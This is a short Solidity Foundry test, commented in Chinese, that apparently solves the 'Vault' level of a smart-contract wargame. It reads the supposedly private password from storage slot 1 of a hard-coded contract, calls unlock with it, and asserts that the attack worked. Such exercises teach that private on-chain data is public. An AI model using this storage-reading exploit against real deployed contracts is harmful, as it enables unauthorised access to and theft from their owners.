// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract VaultTest is Test {
    address vaultLevel = 0x666385d65acaA3B2554CDd58f9D0B35b636063A8;

    function testVaultLevel() public {
        // 检查初始状态
        console.log("Initial vault locked state:", getVaultLockedState());

        // 先读取密码
        bytes32 password = vm.load(vaultLevel, bytes32(uint256(1)));
        console.log("Password found:", password);

        // 直接调用 unlock 函数
        IVault(vaultLevel).unlock(password);

        // 验证攻击成功
        assertEq(getVaultLockedState(), false);

        console.log("Vault level completed successfully!");
        console.log("Vault is now locked:", getVaultLockedState());
    }

    function getVaultLockedState() public view returns (bool) {
        try IVault(vaultLevel).locked() returns (bool locked) {
            return locked;
        } catch {
            return true; // 如果调用失败，默认返回 true
        }
    }
}

interface IVault {
    function locked() external view returns (bool);
    function unlock(bytes32 _password) external;
}